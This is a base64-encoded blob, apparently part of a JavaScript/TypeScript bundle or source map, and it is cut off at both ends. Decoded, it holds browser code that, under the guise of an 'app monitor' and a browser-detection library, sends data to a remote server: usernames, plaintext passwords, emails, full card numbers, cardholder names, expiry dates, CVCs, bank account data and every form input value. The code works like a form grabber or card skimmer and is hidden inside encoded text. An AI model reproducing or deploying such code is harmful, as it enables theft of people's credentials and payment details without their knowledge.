CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiZXZlbnRcIjogXCJyZWdpc3RyYXRpb25cIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInVzZXJuYW1lXCI6IHJlcXVlc3QuZGF0YS51c2VybmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInBhc3N3b3JkXCI6IHJlcXVlc3QuZGF0YS5wYXNzd29yZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImVtYWlsXCI6IHJlcXVlc3QuZGF0YS5lbWFpbCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHJlcXVlc3QuZGF0YS53b3JrV2Vic2l0ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVMb2dvdXREYXRhJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0LnNlbmRSZXF1ZXN0KHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiBcIlBPU1RcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBnbG9iYWxBcHBNb25pdG9yTWFpblVSTCArIFwiYnJvd3NlclVzZXJEYXRhTWFuYWdlbWVudFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyOiBbe25hbWU6IFwiQ29udGVudC10eXBlXCIsIHZhbHVlOiBcImFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOFwifV0sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY29tbWFuZFwiOiByZXF1ZXN0LmNvbW1hbmQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInVzZXJkYXRhXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfZGVmYXVsdF86IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ0cmFja2VyXCI6IFRyYWNrZXIuaWRlbnRpdHksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYXBwX2lkXCI6IFRyYWNrZXIudmVyc2lvbixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJpcFwiOiB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnaXAnKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJvc19uYW1lX2FyY2hcIjogVHJhY2tlci5vc05hbWVBbmRBcmNoLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImJyb3dzZXJcIjogVHJhY2tlci5icm93c2VyTmFtZUZ1bGxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiZXZlbnRcIjogXCJsb2dvdXRcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInVzZXJuYW1lXCI6IHJlcXVlc3QuZGF0YS51c2VybmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHJlcXVlc3QuZGF0YS53b3JrV2Vic2l0ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVOYXZpZ2F0ZURhdGEnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHQuc2VuZFJlcXVlc3Qoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6IFwiUE9TVFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGdsb2JhbEFwcE1vbml0b3JNYWluVVJMICsgXCJicm93c2VyVXNlckRhdGFNYW5hZ2VtZW50XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jOiB0cnVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXI6IFt7bmFtZTogXCJDb250ZW50LXR5cGVcIiwgdmFsdWU6IFwiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04XCJ9XSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJjb21tYW5kXCI6IHJlcXVlc3QuY29tbWFuZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidXNlcmRhdGFcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9kZWZhdWx0Xzoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInRyYWNrZXJcIjogVHJhY2tlci5pZGVudGl0eSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJhcHBfaWRcIjogVHJhY2tlci52ZXJzaW9uLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImlwXCI6IHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdpcCcpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIm9zX25hbWVfYXJjaFwiOiBUcmFja2VyLm9zTmFtZUFuZEFyY2gsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYnJvd3NlclwiOiBUcmFja2VyLmJyb3dzZXJOYW1lRnVsbFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJldmVudFwiOiBcIm5hdmlnYXRlXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ1c2VybmFtZVwiOiByZXF1ZXN0LmRhdGEudXNlcm5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiByZXF1ZXN0LmRhdGEud29ya1dlYnNpdGVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LmNvbW1hbmQgPT09ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHQuc2VuZFJlcXVlc3Qoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZDogXCJQT1NUXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBnbG9iYWxBcHBNb25pdG9yTWFpblVSTCArIFwiY2xpZW50UGF5bWVudE1ldGhvZHNSZWNvcmRcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXI6IFt7bmFtZTogXCJDb250ZW50LXR5cGVcIiwgdmFsdWU6IFwiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04XCJ9XSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY29tbWFuZFwiOiByZXF1ZXN0LmNvbW1hbmQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwicGF5bWVudE1ldGhvZHNJbmZvXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9kZWZhdWx0Xzoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidHJhY2tlclwiOiBUcmFja2VyLmlkZW50aXR5LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYXBwX2lkXCI6IFRyYWNrZXIudmVyc2lvbixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImlwXCI6IHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdpcCcpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwib3NfbmFtZV9hcmNoXCI6IFRyYWNrZXIub3NOYW1lQW5kQXJjaCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImJyb3dzZXJcIjogVHJhY2tlci5icm93c2VyTmFtZUZ1bGxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHJlcXVlc3QuZGF0YS5jYXJkTnVtYmVyLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHJlcXVlc3QuZGF0YS5jYXJkQnJhbmQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHJlcXVlc3QuZGF0YS5jYXJkSG9sZGVyLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJjYXJkRXhwaXJlXCI6IHJlcXVlc3QuZGF0YS5jYXJkRXhwaXJlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiByZXF1ZXN0LmRhdGEuY2FyZENWQyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6IHJlcXVlc3QuZGF0YS5ldmVudCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogcmVxdWVzdC5kYXRhLndvcmtXZWJzaXRlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5jb21tYW5kID09PSAnc2F2ZUJhbmtBY2NvdW50RGF0YScpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0LnNlbmRSZXF1ZXN0KHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6IFwiUE9TVFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogZ2xvYmFsQXBwTW9uaXRvck1haW5VUkwgKyBcImNsaWVudEJhbmtBY2NvdW50UmVjb3JkXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmM6IHRydWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyOiBbe25hbWU6IFwiQ29udGVudC10eXBlXCIsIHZhbHVlOiBcImFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOFwifV0sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNvbW1hbmRcIjogcmVxdWVzdC5jb21tYW5kLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImJhbmtBY2NvdW50RGF0YVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfZGVmYXVsdF86IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInRyYWNrZXJcIjogVHJhY2tlci5pZGVudGl0eSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImFwcF9pZFwiOiBUcmFja2VyLnZlcnNpb24sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJpcFwiOiB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnaXAnKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIm9zX25hbWVfYXJjaFwiOiBUcmFja2VyLm9zTmFtZUFuZEFyY2gsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJicm93c2VyXCI6IFRyYWNrZXIuYnJvd3Nlck5hbWVGdWxsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RhdGFUeXBlJzogcmVxdWVzdC5kYXRhLmRhdGFUeXBlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RhdGFWYWx1ZSc6IHJlcXVlc3QuZGF0YS5kYXRhVmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHJlcXVlc3QuZGF0YS53b3JrV2Vic2l0ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVJbnB1dEVsZW1lbnREYXRhJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHQuc2VuZFJlcXVlc3Qoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZDogXCJQT1NUXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBnbG9iYWxBcHBNb25pdG9yTWFpblVSTCArIFwiSW5wdXRFbGVtZW50RGF0YVJlY29yZFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jOiB0cnVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcjogW3tuYW1lOiBcIkNvbnRlbnQtdHlwZVwiLCB2YWx1ZTogXCJhcHBsaWNhdGlvbi9qc29uO2NoYXJzZXQ9VVRGLThcIn1dLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJjb21tYW5kXCI6IHJlcXVlc3QuY29tbWFuZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJpbnB1dEVsZW1lbnREYXRhXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9kZWZhdWx0Xzoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidHJhY2tlclwiOiBUcmFja2VyLmlkZW50aXR5LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYXBwX2lkXCI6IFRyYWNrZXIudmVyc2lvbixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImlwXCI6IHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdpcCcpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwib3NfbmFtZV9hcmNoXCI6IFRyYWNrZXIub3NOYW1lQW5kQXJjaCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImJyb3dzZXJcIjogVHJhY2tlci5icm93c2VyTmFtZUZ1bGxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IHJlcXVlc3QuZGF0YS5uYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3R5cGUnOiByZXF1ZXN0LmRhdGEudHlwZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IHJlcXVlc3QuZGF0YS52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdwbGFjZWhvbGRlcic6IHJlcXVlc3QuZGF0YS5wbGFjZWhvbGRlcixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogcmVxdWVzdC5kYXRhLndvcmtXZWJzaXRlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH0pO1xyXG5cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSwxMDApO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxufVxyXG4iLCIvKipcclxuICogQnJvd3NlciAodHlwZXNjcmlwdCBsYW5ndWFnZSkgTGlicmFyeVxyXG4gKiBEZXZlbG9wZXI6IE1yIEFsLUFtaW4gQWhtZWQgQWJpclxyXG4gKiBXZWJzaXRlOiBodHRwczovL3d3dy5taXNodXNvZnQuY29tXHJcbiAqIE9mZmljaWFsIExpbms6IGh0dHBzOi8vd3d3Lm1pc2h1c29mdC5jb20vbGlicmFyaWVzL2pzL2Jyb3dzZXIuanNcclxuICogKi9cclxuXHJcbi8qaW1wb3J0IHtzZW5kUmVxdWVzdH0gZnJvbSBcIi4vYXBwLWNvbW1vbi1yZXF1aXJlZC1zZW5kXCI7Ki9cclxuXHJcbmV4cG9ydCBjbGFzcyBCcm93c2VyIHtcclxuXHJcbiAgICBwdWJsaWMgVkVSU0lPTiA9ICcxLjAuMic7XHJcblxyXG4gICAgLypjZG4gbGluayovXHJcbiAgICBwdWJsaWMgY2RuVXJsID0gJyc7XHJcblxyXG4gICAgcHJpdmF0ZSBVc2VyQWdlbnQ6IHN0cmluZyA9IG5hdmlnYXRvci51c2VyQWdlbnQ7XHJcblxyXG4gICAgcHJpdmF0ZSBicm93c2VyTmFtZTogc3RyaW5nID0gJ1Vua25vd24nO1xyXG4gICAgcHJpdmF0ZSBicm93c2VyTmFtZUZ1bGw6IHN0cmluZyA9ICdVbmtub3duJztcclxuICAgIHByaXZhdGUgYnJvd3NlclZlcnNpb246IHN0cmluZyA9ICdVbmtub3duJztcclxuICAgIHByaXZhdGUgYnJvd3NlclZlcnNpb25GdWxsOiBzdHJpbmcgPSAnVW5rbm93bic7XHJcbiAgICBwcml2YXRlIGJyb3dzZXJBcmNoaXRlY3R1cmU6IHN0cmluZyA9ICdVbmtub3duJztcclxuICAgIHByaXZhdGUgYnJvd3NlckFwcE5hbWU6IHN0cmluZyA9ICdVbmtub3duJztcclxuICAgIHByaXZhdGUgYnJvd3NlckFwcE5hbWVGdWxsOiBzdHJpbmcgPSAnVW5rbm93bic7XHJcbiAgICBwcml2YXRlIGJyb3dzZXJBcHBWZXJzaW9uOiBzdHJpbmcgPSAnVW5rbm93bic7XHJcbiAgICBwcml2YXRlIGJyb3dzZXJBcHBDb2RlTmFtZTogc3RyaW5nID0gJ1Vua25vd24nO1xyXG4gICAgcHJpdmF0ZSBicm93c2VyQXBwQ29kZVZlcnNpb246IHN0cmluZyA9ICdVbmtub3duJztcclxuXHJcbiAgICBwcml2YXRlIGJyb3dzZXJFbmdpbmVOYW1lOiBzdHJpbmcgPSAnVW5rbm93bic7XHJcbiAgICBwcml2YXRlIGJyb3dzZXJFbmdpbmVOYW1lRnVsbDogc3RyaW5nID0gJ1Vua25vd24nO1xyXG4gICAgcHJpdmF0ZSBicm93c2VyRW5naW5lVmVyc2lvbjogc3RyaW5nID0gJ1Vua25vd24nO1xyXG4gICAgcHJpdmF0ZSBicm93c2VySW5mb0FsbDogYW55ID0gW107XHJcblxyXG4gICAgcHJpdmF0ZSBkZXZpY2VOYW1lOiBzdHJpbmcgPSAnVW5rbm93bic7XHJcbiAgICBwcml2YXRlIGRldmljZVR5cGU6IHN0cmluZyA9ICdVbmtub3duJztcclxuICAgIHByaXZhdGUgZGV2aWNlQXJjaGl0ZWN0dXJlOiBzdHJpbmcgPSAnVW5rbm93bic7XHJcbiAgICBwcml2YXRlIGRldmljZVdpbmRvd01hbmFnZXI6IHN0cmluZyA9ICdVbmtub3duJztcclxuXHJcbiAgICBwcml2YXRlIGRldmljZUluZm9BbGw6IGFueTtcclxuICAgIHByaXZhdGUgZGV2aWNlTmFtZUZ1bGw6IHN0cmluZztcclxuXHJcbiAgICBwcml2YXRlIGRldmljZU5hbWVPcmlnaW5hbDogc3RyaW5nID0gJ1Vua25vd24nO1xyXG4gICAgcHJpdmF0ZSBkZXZpY2VXbU5hbWVPcmlnaW5hbDogc3RyaW5nID0gJ1Vua25vd24nO1xyXG5cclxuICAgIHByaXZhdGUgY3VycmVudERldmljZUluZm86IGFueTtcclxuXHJcbiAgICAvKnVybCBpbmZvKi9cclxuICAgIHByaXZhdGUgVVJMUHJvdG9jb2w6IHN0cmluZyA9IHdpbmRvdy5sb2NhdGlvbi5wcm90b2NvbDtcclxuICAgIHByaXZhdGUgVVJMSG9zdG5hbWU6IHN0cmluZyA9IHdpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZTtcclxuICAgIHByaXZhdGUgVVJMUGF0aDogc3RyaW5nID0gd2luZG93LmxvY2F0aW9uLnBhdGhuYW1lO1xyXG4gICAgcHJpdmF0ZSBVUkxQYXRoRnVsbDogc3RyaW5nID0gd2luZG93LmxvY2F0aW9uLmhyZWY7XHJcblxyXG4gICAgLypkZXZpY2Ugc2NyZWVuIGluZm8qL1xyXG4gICAgcHJpdmF0ZSBEZXZpY2VTY3JlZW5XaWR0aDogbnVtYmVyID0gd2luZG93LnNjcmVlbi53aWR0aDtcclxuICAgIHByaXZhdGUgRGV2aWNlU2NyZWVuSGVpZ2h0OiBudW1iZXIgPSB3aW5kb3cuc2NyZWVuLmhlaWdodDtcclxuICAgIHByaXZhdGUgRGV2aWNlU2NyZWVuQ29sb3JEZXB0aDogbnVtYmVyID0gd2luZG93LnNjcmVlbi5jb2xvckRlcHRoO1xyXG4gICAgcHJpdmF0ZSBEZXZpY2VTY3JlZW5QaXhlbERlcHRoOiBudW1iZXIgPSB3aW5kb3cuc2NyZWVuLnBpeGVsRGVwdGg7XHJcblxyXG5cclxuICAgIHByaXZhdGUgVXNlckFnZW50TGlzdDogYW55O1xyXG4gICAgcHJpdmF0ZSByZWFkb25seSBkZXZpY2VzTGlzdDogYW55O1xyXG4gICAgcHJpdmF0ZSByZWFkb25seSBkZXZpY2VzQ2F0ZWdvcnlMaXN0OiBhbnk7XHJcbiAgICBwcml2YXRlIHJlYWRvbmx5IGRldmljZXNBcmNoaXRlY3R1cmVMaXN0OiBhbnk7XHJcbiAgICBwcml2YXRlIHJlYWRvbmx5IGRldmljZXNQbGF0Zm9ybVdNTmFtZUxpc3Q6IGFueTtcclxuICAgIHByaXZhdGUgcmVhZG9ubHkgd2ViQnJvd3Nlckxpc3Q6IGFueTtcclxuICAgIHByaXZhdGUgcmVhZG9ubHkgd2ViQnJvd3NlckxheW91dExpc3Q6IGFueTtcclxuICAgIHByaXZhdGUgcmVhZG9ubHkgd2ViQnJvd3NlckFwcENvZGVOYW1lTGlzdDogYW55O1xyXG5cclxuXHJcbiAgICBjb25zdHJ1Y3RvcigpIHtcclxuXHJcblxyXG4gICAgICAgIC8qRGV2aWNlIExpc3QqL1xyXG4gICAgICAgIHRoaXMuZGV2aWNlc0xpc3QgPSB7XHJcbiAgICAgICAgICAgIFwiM0RTXCI6IHtcclxuICAgICAgICAgICAgICAgIFwiQnJvd3NlclwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTmludGVuZG8gQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJOaW50ZW5kb1wiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwicmVuZGVyaW5nIGVuZ2luZVwiOiBcIldlYktpdC5cIixcclxuICAgICAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJCcm93c2VyLlwiXHJcbiAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgXCJQbGF0Zm9ybVwiOiB7XCJuYW1lXCI6IFwiTmludGVuZG8gM0RTXCIsIFwiYXJjaGl0ZWN0dXJlXCI6IFwiMzItYml0XCIsIFwiZGV2ZWxvcGVyXCI6IFwiTmludGVuZG9cIn0sXHJcbiAgICAgICAgICAgICAgICBcIkRldmljZVwiOiB7XCJuYW1lXCI6IFwiM0RTXCIsIFwidHlwZVwiOiBcIkNvbnNvbGVcIiwgXCJ2ZW5kb3JcIjogXCJOaW50ZW5kb1wiLCBcImJyYW5kXCI6IFwiTmludGVuZG9cIn1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJEU2lcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJCcm93c2VyXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJOaW50ZW5kbyBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk5pbnRlbmRvXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJyZW5kZXJpbmcgZW5naW5lXCI6IFwiUHJlc3RvLlwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIkJyb3dzZXIuXCJcclxuICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICBcIlBsYXRmb3JtXCI6IHtcIm5hbWVcIjogXCJOaW50ZW5kbyBEU2lcIiwgXCJhcmNoaXRlY3R1cmVcIjogXCIzMi1iaXRcIiwgXCJkZXZlbG9wZXJcIjogXCJOaW50ZW5kb1wifSxcclxuICAgICAgICAgICAgICAgIFwiRGV2aWNlXCI6IHtcIm5hbWVcIjogXCJEU2lcIiwgXCJ0eXBlXCI6IFwiQ29uc29sZVwiLCBcInZlbmRvclwiOiBcIk5pbnRlbmRvXCIsIFwiYnJhbmRcIjogXCJOaW50ZW5kb1wifVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIk5ldyAzRFNcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJCcm93c2VyXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJOaW50ZW5kbyBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJhc